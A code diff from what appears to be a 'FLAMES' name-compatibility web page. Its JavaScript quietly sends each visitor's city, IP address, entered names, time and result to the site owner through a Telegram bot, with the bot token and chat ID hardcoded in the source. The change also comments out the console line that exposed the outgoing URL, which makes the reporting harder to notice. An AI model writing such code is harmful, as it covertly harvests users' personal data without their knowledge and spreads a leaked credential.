@@ -103,16 +103,21 @@ var token ="1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M";
 
 var chat_id = -1001717443651;
 
-var time = new Date();
+var today = new Date();
+   var day = today.getDate();
+   var month = today.getMonth() + 1;
+   var year = today.getFullYear();
+   var hour = today.getHours();
+   var minute = today.getMinutes();
 
-var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + " with IP - " + data1 +' has checked flames on your website with names  '+firstName +"   "+secondName + "  at  "+time + " and their result was  " +final;
+var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + " with IP - " + data1 +' has checked flames on your website with names  '+firstName +"   "+secondName + "  at  " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + " and their result was  " +final;
 
 let api = new XMLHttpRequest();
 
  api.open("GET", url, true);
 
  api.send();
-console.log(url); 
+// console.log(url); 
 
   });
 
